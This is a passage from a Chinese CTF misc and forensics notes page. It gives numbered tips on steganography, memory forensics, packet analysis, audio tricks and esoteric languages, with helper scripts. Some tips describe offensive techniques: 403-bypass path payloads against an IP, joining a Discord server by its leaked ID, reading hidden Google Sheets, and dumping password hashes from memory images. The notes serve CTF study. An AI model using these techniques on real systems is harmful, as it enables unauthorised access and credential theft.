href="https://eprint.iacr.org/2020/301.pdf">toy加密</a>。例题:<a href="https://www.cnblogs.com/vuclw/p/16424799.html">[羊城杯 2020]signin</a></li><li>ALPHUCK一种 Programming Language ,只由 a,c,e,i,j,o,p,s 这 8 个小写字母组成。</li><li><a href="https://baike.baidu.com/item/%E4%B8%89%E5%88%86%E5%AF%86%E7%A0%81/2250183">三分密码</a>+veracrypt挂载被加密磁盘。例题:<a href="https://www.cnblogs.com/vuclw/p/16428558.html">[GKCTF 2021]0.03</a></li><li>条形码修复。例题:<a href="https://blog.csdn.net/zippo1234/article/details/109249593">[BSidesSF2020]barcoder</a></li><li>TLS协议需要解密才能追踪。菜单栏-&gt;Wireshark-&gt;Preferences-&gt;Protocols-&gt;TLS。有RSA私钥选RSA key list，有sslkey的log文件在下方log filename选择log文件。log文件里的格式不一定相同，注意后缀名log。</li><li>TCP-IP数据报的Identification字段隐写。例题:<a href="https://blog.csdn.net/qq_45699846/article/details/123833160">[羊城杯 2020]TCP_IP</a></li><li>小米手机的备份文件实际也是ANDROID BACKUP文件，去掉小米的header后即可使用<a href="https://github.com/nelenkov/android-backup-extractor">脚本</a>解压。</li><li>rpg maker修改游戏。例题:<a href="https://blog.csdn.net/qq_49354488/article/details/115655115">[*CTF2019]She</a></li><li>ARCHPR无法爆破RAR5，可以用rar2john提取hash后利用hashcat爆破密码。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/118422921">[羊城杯 2020]image_rar</a></li><li>字符串经过brainfuck加密后应该是++++++++[开头的，所以遇见解出来是乱码的brainfuck可以看看开头是否正确。</li><li>空格+tab隐写过滤脚本</li></ol><p><a href="https://www.bilibili.com/read/cv14000314">例题及来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_list</span>(<span class="hljs-params">dir_path</span>):<br>    _file_list = os.listdir(dir_path)<br>    file_list = []<br>    <span class="hljs-keyword">for</span> file_str <span class="hljs-keyword">in</span> _file_list:<br>        new_dir_path = dir_path+<span class="hljs-string">&#x27;/&#x27;</span>+file_str<br>        <span class="hljs-keyword">if</span> os.path.isdir(new_dir_path):<br>            file_list.extend(get_file_list(new_dir_path))<br>        <span class="hljs-keyword">else</span>:<br>            file_list.append(new_dir_path)<br>    <span class="hljs-keyword">return</span> file_list<br>file_list = get_file_list(<span class="hljs-string">r&#x27;/Users/constellation/Desktop/source_code&#x27;</span>)<br><span class="hljs-keyword">for</span> file_str <span class="hljs-keyword">in</span> file_list:<br>    f = <span class="hljs-built_in">open</span>(file_str, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = f.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27; \t \t&#x27;</span> <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-built_in">print</span>(file_str)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ol start="75"><li>swf文件是flash文件，可用<a href="https://github.com/jindrapetrik/jpexs-decompiler">JPEXS Free Flash Decompiler</a>反编译。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/115833842">[*CTF2019]babyflash</a></li><li>音频lsb提取。例题将一张bmp图片通过lsb的形式写入音频，需要知道正确的宽高才能恢复原来的图片。例题:<a href="https://blog.csdn.net/qq_45699846/article/details/123847848">静静听这么好听的歌</a></li><li><a href="https://www.pos-shop.ru/upload/iblock/ebd/ebd9bed075d1b925be892b297590fc18.pdf">TSPL&#x2F;TSPL2 Programming Language</a>，用于打印机。例题:<a href="https://tobatu.gitee.io/blog/2020/10/06/BUUCTF-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-9/#RCTF2019-printer">[RCTF2019]printer</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%8C%97%E7%BA%A6%E9%9F%B3%E6%A0%87%E5%AD%97%E6%AF%8D">北约音标字母</a>，Alfa，Bravo之类的，其实就是每个单词的首字母。</li><li>pgp加密，使用<a href="https://pgptool.github.io/">PGPTool</a>解密。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/115856882">[BSidesSF2019]bWF0cnlvc2hrYQ</a></li><li>镜像FTK挂载仿真，使用<a href="https://iowin.net/en/ftk-imager/?download=true">AccessData FTK Imager</a>。例题:<a href="https://shimo.im/docs/6hyIjGkLoRc43JRs">[NPUCTF2020]回收站</a></li><li>利用<a href="https://developer.aliyun.com/article/418787">dig</a>命令分析dns shell。例题:<a href="https://meowmeowxw.gitlab.io/ctf/utctf-2020-do-not-stop/">[UTCTF2020]dns-shell</a></li><li>乐高ev3机器人分析（蓝牙协议）。基本的4个协议为HCI、L2CAP、SDP、RFCOMM。对比于英特网五层结构来说：HCI相当于与物理层打交道的协议，L2CAP协议则是链路层相关协议，SDP和RFCOMM则是运输层相关协议，当然其上也有对应的应用层相关的一些协议。SDP用来发现周围蓝牙服务，然后由L2CAP来建立信道链接，然后传输由上层RFCOMM给予的数据分组。如果只是提取数据的话，只需要关心：RFCOMM协议。例题:<a href="https://www.youncyb.cn/?p=493">[HITCON2018]ev3basic</a></li><li>使用<a href="https://www.runoob.com/linux/linux-comm-e2fsck.html">e2fsck</a>命令修复超级块损坏的ext2文件。例题:<a href="http://www.ga1axy.top/index.php/archives/17/">[BSidesSF2020]mpfrag</a></li><li>压感数位板usb协议分析+emoji aes密码。例题:<a href="http://www.ga1axy.top/index.php/archives/43/">[RoarCTF2019]davinci_cipher</a></li><li><a href="https://www.rmnof.com/article/exiftool-introduction/">exiftool</a>使用。当用exiftool发现有<code>ThumbnailImage(Binary data 215571 bytes, use -b option to extract)</code>一项时，可以用<code>exiftool -b -ThumbnailImage attachment.jpg &gt; flag.jpg</code>提取出缩略图。例题:<a href="https://www.shawroot.cc/142.html">[BSidesSF2019]delta</a>，这题还有条形码分析。</li><li>Discord服务器link泄露。可用下方的代码插入一个iframe，强制加入服务器。</li></ol><p>例题及来源:<a href="https://github.com/uclaacm/lactf-archive/tree/main/2023/misc/discord-leak">discord l34k</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 1. Copy Discord embed iframe template (visit any server Server Settings -&gt; Widget -&gt; Premade Widget). --&gt;</span><br>        <span class="hljs-comment">&lt;!-- 2. Replace id with id from prompt. --&gt;</span><br>        <span class="hljs-comment">&lt;!-- 3. Open this file up in a browser. --&gt;</span><br>        <span class="hljs-comment">&lt;!-- 4. Click &quot;Join Discord&quot; to access the server. --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://discord.com/widget?id=1060030874722259057&amp;theme=dark&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;350&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500&quot;</span> <span class="hljs-attr">allowtransparency</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">sandbox</span>=<span class="hljs-string">&quot;allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="87"><li>利用Google Sheets API获取被保护、隐藏的sheet内容。需要在<a href="https://www.google.com/script/start/">这里</a>运行。</li></ol><p>例题及来源:<a href="https://github.com/uclaacm/lactf-archive/tree/main/2023/misc/hidden-in-plain-sheets">hidden in plain sheets</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> sheet = <span class="hljs-title class_">SpreadsheetApp</span>.<span class="hljs-title function_">openById</span>(<span class="hljs-string">&quot;1ULdm_KCOYCWuf6gqpg6tm0t-wnWySX_Bf3yUYOfZ2tw&quot;</span>);<br>  <span class="hljs-keyword">const</span> sheets = sheet.<span class="hljs-title function_">getSheets</span>();<br>  <span class="hljs-keyword">const</span> secret = sheets.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x.<span class="hljs-title function_">getName</span>() == <span class="hljs-string">&quot;flag&quot;</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(secret.<span class="hljs-title function_">getDataRange</span>().<span class="hljs-title function_">getValues</span>().<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">l</span> =&gt;</span> l.<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;&quot;</span>)).<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;\n&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><ol start="88"><li>智能汽车协议分析+arm可执行文件逆向。例题:<a href="https://blog.csdn.net/Breeze_CAT/article/details/106156567">[网鼎杯 2020 青龙组]Teslaaaaa</a></li><li><a href="https://github.com/BCACTF/bcactf-4.0/tree/main/ow">ow</a> &amp; <a href="https://blog.csdn.net/u011297466/article/details/81059248">[QCTF2018]Noise</a></li></ol><ul><li>利用相位抵消分离特殊信号。具体步骤如下：<ul><li>将想要分离的噪音与有用的音频分开。有些题会给出噪音的原音频（不包含有用信息，这样可以直接相位反转后抵消），有的题则是分声道：噪音与音频分别为左右声道。audacity如何分离声道：在切换频谱图同样的菜单栏里有“分割立体声轨道选项”，点击后即能看到左右声道</li><li>左右两声道的的平移滑块都滑到“置中”</li><li>选中噪音声道，菜单栏效果-&gt;Special-&gt;倒转（上下）即可翻转噪音相位</li><li>将反转后的噪音声道与混合噪音的音频声道同时播放，即可获取原音频</li></ul></li><li>不用audacity而是使用<a href="https://github.com/jiaaro/pydub">pydub</a>模块：</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pydub <span class="hljs-keyword">import</span> AudioSegment<br>song = AudioSegment.from_mp3(<span class="hljs-string">&quot;./ow.mp3&quot;</span>)<br><span class="hljs-comment"># Extract left and right channels from stereo mp3</span><br>left_channel = song.split_to_mono()[<span class="hljs-number">0</span>]<br>right_channel = song.split_to_mono()[<span class="hljs-number">1</span>]<br><span class="hljs-comment"># Invert phase of the Right channel</span><br>inverted_right_channel = right_channel.invert_phase()<br><span class="hljs-comment"># Merge left and inverted right channels</span><br>flag = left_channel.overlay(inverted_right_channel)<br>flag.export(<span class="hljs-string">&quot;./flag.mp3&quot;</span>, <span class="hljs-built_in">format</span>=<span class="hljs-string">&quot;mp3&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>直接用audacity自带的除噪功能（效果没有前两个好，但是能听到）：<a href="https://github.com/m4karoni/CTF/tree/main/BCACTF/2023/Forensics#owvolume-warning">https://github.com/m4karoni/CTF/tree/main/BCACTF/2023/Forensics#owvolume-warning</a></li></ul><ol start="90"><li>Wireshark菜单栏-&gt;Statistics-&gt;Conversations可以看到抓到的包的所有通信的ip和端口号，有时候是流量题找ip的捷径。</li><li><a href="https://en.wikipedia.org/wiki/Whitespace_(programming_language)">WHITESPACES LANGUAGE</a>，由空格，tab键等字符组成，不可见。</li><li><a href="https://www.dcode.fr/hexahue-cipher">hexahue cipher</a>，形如：</li></ol><p><img src="C:/Users/a1348/Desktop/NoobCTF-main/笔记/images/hexahue.png" alt="hexahue"></p><ol start="93"><li>windows powershell历史记录文件路径：<code>%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code>。</li><li>对于未经改动过的linux vmem dump，可以直接用strings+grep过滤出操作系统（operating system）和内核版本（kernel version）：</li></ol><ul><li>strings PVE.vmem | grep -i “Linux version”</li><li>grep -a “BOOT_IMAGE” dump.mem （更详细的内核版本）</li></ul><p>操作系统版本号：</p><ul><li>grep -a “Linux release” dump.mem</li></ul><ol start="95"><li><p>遇到volatility不默认支持的image时，可以通过94条的方法手动获得版本，然后去官网下载对应的镜像，存到<code>volatility\plugins\overlays\linux</code>中。现在再用插件就能获取到信息了。例题:<a href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">PVE</a>，这题也介绍了volatility的初步使用方法。补充更多例题：<a href="https://hackmd.io/@TuX-/BkWQh8a6i#ForensicsWanna-1">Wanna</a></p></li><li><p>403 bypass的特殊技巧。一般是在路径上做手脚，例如：</p></li></ol><ul><li><a href="http://20.121.121.120/*/secret.php">http://20.121.121.120/*/secret.php</a></li><li><a href="http://20.121.121.120/secret.php">http://20.121.121.120/./secret.php</a></li><li><a href="http://20.121.121.120/%2f/secret.php">http://20.121.121.120/%2f/secret.php</a></li></ul><p>等。一个局限性较大的技巧是去<a href="https://archive.org/web/">Wayback Machine</a>搜对应网址。要求题目网址提前上线过。</p><ol start="97"><li><a href="https://osintframework.com/">OSINT思维导图</a>。</li><li>某些电子邮件的密码可能在<a href="https://pastebin.com/">pastebin</a>泄露。</li><li><a href="https://esolangs.org/wiki/Fish">Fish</a>编程语言+<a href="https://gist.github.com/anonymous/6392418">解释器</a>。例题:<a href="https://github.com/ZorzalG/the-big-MHSCTF2023-writeups/blob/main/Flowers.md">Flowers</a></li><li>Powershell命令历史存储于ConsoleHost_history.txt。</li><li>volatility3使用。关于volatility的教程大多都是volatility2的，记录一些平时看到的命令。注意镜像（如img后缀）和内存（如mem）后缀是不同的，工具不能混用。比如volatility就不能用来分析镜像。(volatility3似乎没有找profile的插件，只能用volatility2找：<code>python2 vol.py -f ctf.raw imageinfo</code>)</li></ol><ul><li>python3 vol.py -f Memdump.raw windows.filescan.FileScan<ul><li>搜寻Memdump.raw中的文件,会给出文件对应的偏移</li></ul></li><li>python3 vol.py -f Memdump.raw windows.dumpfiles.DumpFiles –virtaddr(<code>--physaddr</code>) 0xc88f21961af0<ul><li>根据文件偏移提取文件</li></ul></li><li>python3 vol.py -f mem.raw windows.cmdline.CmdLine<ul><li>cmd中运行的命令</li></ul></li><li>python3 vol.py -f mem.raw windows.info<ul><li>显示windows镜像信息。用例： <a href="https://j-0k3r.github.io/2024/01/23/KnightCTF%202024/">https://j-0k3r.github.io/2024/01/23/KnightCTF%202024/</a></li></ul></li><li>python3 vol.py -f mem.raw windows.netstat<ul><li>查看网络连接状况（可用于获取本机ip）</li></ul></li><li>python3 vol.py -f mem.raw windows.registry.hivelist.HiveList<ul><li>查看注册表</li></ul></li><li>python3 vol.py -f mem.raw windows.registry.printkey.PrintKey –offset 0xf8a0000212d0<ul><li>通过上一步获取到注册表后，根据获得的偏移进一步获取键名信息。</li></ul></li><li>python3 vol.py -f mem.raw windows.registry.printkey.PrintKey –offset 0xf8a0000212d0 –key “ControlSet001\Control\ComputerName\ComputerName”  <ul><li>可以一直沿着获取的键名走下去。上面的命令用于获取主机名。详情见<a href="https://www.bnessy.com/archives/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81-volatility">此处</a>,内含基础例题。</li></ul></li><li><a href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/forensics/dumpster-dive">Dumpster Dive</a><ul><li>linux.bash for bash history</li><li>linux.pslist to get pid of processes</li><li>linux.proc has a dump option, <code>linux.proc --pid &lt;pid&gt; --dump</code></li></ul></li><li><a href="https://pakcyberbot.github.io/CTF-Writeups/posts/BHME-NotSupported/">Not supported</a><ul><li><code>vol -f file.mem windows.memmap.Memmap --pid &lt;num&gt; --dump</code>:dump pid为num的进程的内容。有意思的地方在于，Memdumps are essentially RAM moment captures，可以将dump出来的文件后缀改成.data放进GIMP，能看到内存的图片，包括字符串形式的flag。参考 <a href="https://www.youtube.com/watch?v=-E3VTblFkKg">https://www.youtube.com/watch?v=-E3VTblFkKg</a></li><li>另一道使用这个技巧的题的图文wp：<a href="https://warlocksmurf.github.io/posts/l3akctf2024">Pixelated</a>和<a href="https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html">参考文章</a>，更详细一点</li><li>另外，如果要grep dump出来的memory，记得用<code>strings * -e l</code>，因为dump出来的内容都是小端的(但有的时候直接grep也行)</li></ul></li><li><a href="https://github.com/daffainfo/ctf-writeup/tree/main/2023/niteCTF%202023/conqueror">conqueror</a><ul><li><code>vol -f ctf.mem windows.hashdump.Hashdump</code>:dump用户及其md5 hash</li></ul></li><li><a href="https://odintheprotector.github.io/2024/02/17/bitsctf2024-dfir.html">Bypassing Transport Layer</a><ul><li><code>vol.py -f ctf.mem windows.netscan</code>:查看网络连接情况</li><li>TLS流的requests和responses都是加密的，解密需要密钥。若找到类似keylog.pcapng的文件也可以解密</li></ul></li><li><a href="https://blog.bi0s.in/2024/02/27/Forensics/BatmanInvestigationII-GothamUndergroundCorruption-bi0sCTF2024/">Batman Investigation II</a><ul><li><code>vol -f ctf.raw windows.pslist.PsList</code>:List active process list</li><li><code>vol -f ctf.raw windows.mftscan.MFTScan</code>:获取<a href="https://www.sciencedirect.com/topics/computer-science/master-file-table">MFT</a>文件</li></ul></li><li><a href="https://github.com/Tokeii0/LovelyMem">LovelyMem</a>:一个图形界面取证工具</li></ul><ol start="102"><li><a href="https://en.wikipedia.org/wiki/Huffman_coding">Huffman coding</a>，例题:<a href="https://medium.com/@vj35.cool/the-bytebandits-ctf-2023-449a2d64c7b4">Tree of Secrets</a>,例题是文件夹形式的Huffman coding。动图解释：<a href="https://zhuanlan.zhihu.com/p/63362804">https://zhuanlan.zhihu.com/p/63362804</a></li><li><a href="https://github.com/5t0n3/ctf-writeups/blob/main/2023-lactf/misc/private-bin/README.md">private-bin</a></li></ol><ul><li>分析end to end（e2e）加密（HTTPS，TLS）pcapng</li><li>TLS的握手报文会传输hostname信息（<a href="https://www.cloudflare.com/zh-cn/learning/ssl/what-is-sni/">SNI</a>），可用<code>tls.handshake.extensions_server_name</code>过滤。</li><li>获取TLS密钥后，可用<code>tls and (http or http2)</code>过滤出解密后的报文。</li><li>AES-256的密钥长度为32字节。</li></ul><ol start="104"><li>git命令更改config，使用制定用户的身份推送远程库。例题:<a href="../../CTF/LA%20CTF/Misc/new-challenge.md">new-challenge</a></li><li>MSB（most signficant bit）隐写。将信息藏在RGB颜色分量二进制值的最高位。与<a href="https://3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-PNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99">LSB</a>不同的是，这种隐写会使图片颜色失真（损坏）。例题:<a href="https://ctftime.org/writeup/16174">msb</a>，里面有图片颜色失真的例子。可在<a href="https://stegonline.georgeom.net/extract">stegonline</a>提取。选项设置如下：</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">R:<span class="hljs-number">7</span><br>G:<span class="hljs-number">7</span><br>B:<span class="hljs-number">7</span><br>Pixel <span class="hljs-keyword">Order</span>:<span class="hljs-keyword">Row</span><br><span class="hljs-type">Bit</span> <span class="hljs-keyword">Order</span>:MSB<br><span class="hljs-type">Bit</span> Plane <span class="hljs-keyword">Order</span>:RGB<br>Trim <span class="hljs-keyword">Trailing</span> Bits:<span class="hljs-keyword">No</span><br></code></pre></td></tr></table></figure><ol start="106"><li>linux 使用mount挂载img镜像。</li></ol><ul><li><a href="https://zhou-yuxin.github.io/articles/2015/Linux%E6%8C%82%E8%BD%BDimg%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6/index.html">Linux挂载img磁盘镜像文件</a></li><li><a href="https://blog.51cto.com/u_3823536/2501563">Linux如何挂载img镜像</a></li></ul><p>偏移可用<code>binwalk xxx.img</code>(或者<code>fdisk -l disk.img</code>)获得。挂载镜像后，输入<code>sudo su</code>来获取root权限。分析镜像时，<code>tree</code>命令可帮助查看目录的结构。挂载镜像后,<code>.ash_history</code>文件将不会存储原本镜像的命令，而是挂载者在镜像里输入的命令。因此挂载是无法获取命令历史的。</p><ol start="107"><li><a href="https://github.com/Dhanush-T/PCTF23-writeups/blob/main/Forensics/Nuclearophine/writeup.md">Nuclearophine</a></li></ol><ul><li>使用python Scapy库提取udp包数据</li><li>WAV文件修复。WAV文件的第37-40个字节应为data。</li><li>stegolsb提取WAV文件内容。</li><li><a href="https://rfmw.em.keysight.com/rfcomms/refdocs/cdma2k/cdma2000_meas_dtmf_desc.html">DTMF tones</a>分析。</li></ul><ol start="108"><li>audacity可以分析一段特定音频的频率情况。在audacity里选中一个范围的音频后，去Analyze –&gt; Plot Spectrum即可查看该段音频的频率情况。例题:<a href="https://github.com/jdabtieu/wxmctf-2023-public/blob/main/foren2/writeup.md">Sneaky Spying</a></li><li><a href="https://wiki.osdev.org/USB_Human_Interface_Devices">usb mouse</a>&#x2F;usb鼠标流量包(如Microsoft Paint)分析。可直接用<a href="https://github.com/WangYihang/UsbMiceDataHacker/tree/master">脚本</a>提取数据并matplotlib.pyplot绘制数据。例题:<a href="https://github.com/jdabtieu/wxmctf-2023-public/blob/main/foren4/writeup.md">Paint</a></li><li>一张png的文件结构包含下列字符串：<code>PNG</code>,<code>IHDR</code>,<code>sRGB</code>,<code>pHYs</code>,<code>IDAT</code>。只有第一个，第二个和第五个损坏会导致图片无法打开。</li><li><a href="https://github.com/jdabtieu/wxmctf-2023-public/blob/main/misc2/writeup.md">Broken Telephone</a></li></ol><ul><li>根据svg图片数据写入svg图片文件</li><li>svg图片文件头+<a href="https://www.w3school.com.cn/svg/svg_path.asp"><path></a>标签的数据特征（hex颜色格式+路径数据MCZ等）。</li></ul><ol start="112"><li><a href="https://github.com/jrspruitt/ubi_reader">UBI Reader</a>可用于提取UBIfs镜像数据内的文件。</li><li>终端的whois命令不仅可以查询domain，还可以查询ip地址。</li><li><a href="https://workmanlayout.org/">workman</a>等键盘布局（layout）相互转换<a href="https://awsm-tools.com/keyboard-layout">网站</a>。</li><li><a href="https://github.com/BlackAnon22/BlackAnon22.github.io/blob/main/posts/CTF%20Competitions/picoCTF_2023.md#unforgottenbits-500-points">UnforgottenBits</a></li></ol><ul><li>linux img镜像分析。</li><li>使用mount命令挂载镜像，autospy(ui版tsk)获取被删除的邮件。因为邮件一定有“subject”，于是在“keyword search”处搜索subject，即可看到文件。</li><li><a href="https://www.wikiwand.com/en/Golden_ratio_base">golden ratio base</a>解码脚本。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><br><span class="hljs-comment"># Define the Base-Phi constant</span><br>PHI = (<span class="hljs-number">1</span> + math.sqrt(<span class="hljs-number">5</span>)) / <span class="hljs-number">2</span><br><br><span class="hljs-comment"># Define a function to perform Base-Phi decoding</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">base_phi_decode</span>(<span class="hljs-params">encoded_string</span>):<br>    <span class="hljs-comment"># Split the encoded string into segments separated by periods</span><br>    segments = encoded_string.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br><br>    <span class="hljs-comment"># Initialize the result string</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-comment"># Iterate over each segment</span><br>    <span class="hljs-keyword">for</span> segment <span class="hljs-keyword">in</span> segments:<br>        <span class="hljs-comment"># Initialize the decoded value for this segment to 0</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(segment))<br>        value = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># Iterate over each character in the segment</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(segment)):<br>            <span class="hljs-comment"># If the character is &#x27;1&#x27;, add PHI to the decoded value</span><br>            <span class="hljs-keyword">if</span> segment[i] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                value += PHI**(<span class="hljs-built_in">len</span>(segment) - i - <span class="hljs-number">1</span>)<br><br>        <span class="hljs-comment"># Append the decoded character to the result string</span><br>        result += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(value))<br><br>    <span class="hljs-comment"># Return the result string</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment"># Test the function with the given encoded string</span><br>encoded_string = <span class="hljs-string">&quot;01010010100.01001001000100.01001010000100&quot;</span><br><br><br>eeee = encoded_string.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>out = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(eeee)-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> i ==<span class="hljs-number">0</span>:<br>        out.append(eeee[i]+<span class="hljs-string">&#x27;.&#x27;</span>+eeee[i+<span class="hljs-number">1</span>][:<span class="hljs-number">3</span>])<br>    <span class="hljs-keyword">else</span>:<br>        out.append(eeee[i][<span class="hljs-number">3</span>:]+<span class="hljs-string">&#x27;.&#x27;</span>+eeee[i+<span class="hljs-number">1</span>][:<span class="hljs-number">3</span>])<br><br><span class="hljs-comment"># print(out)</span><br><br><br><span class="hljs-comment"># decoded_string = base_phi_decode(encoded_string)</span><br><br><span class="hljs-comment"># print(decoded_string)</span><br><br>key = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> out:<br><br>    integer_part, fractional_part = p.split(<span class="hljs-string">&quot;.&quot;</span>)<br><br><br>    <span class="hljs-comment"># Convert the integer part to decimal</span><br>    decimal_value = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(integer_part)):<br>        decimal_value += <span class="hljs-built_in">int</span>(integer_part[i]) * (PHI ** (<span class="hljs-built_in">len</span>(integer_part) - i - <span class="hljs-number">1</span>))<br><br>    <span class="hljs-comment"># Convert the fractional part to decimal</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(fractional_part) &gt; <span class="hljs-number">0</span>:<br>        fractional_value = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fractional_part)):<br>            fractional_value += <span class="hljs-built_in">int</span>(fractional_part[i]) * (<span 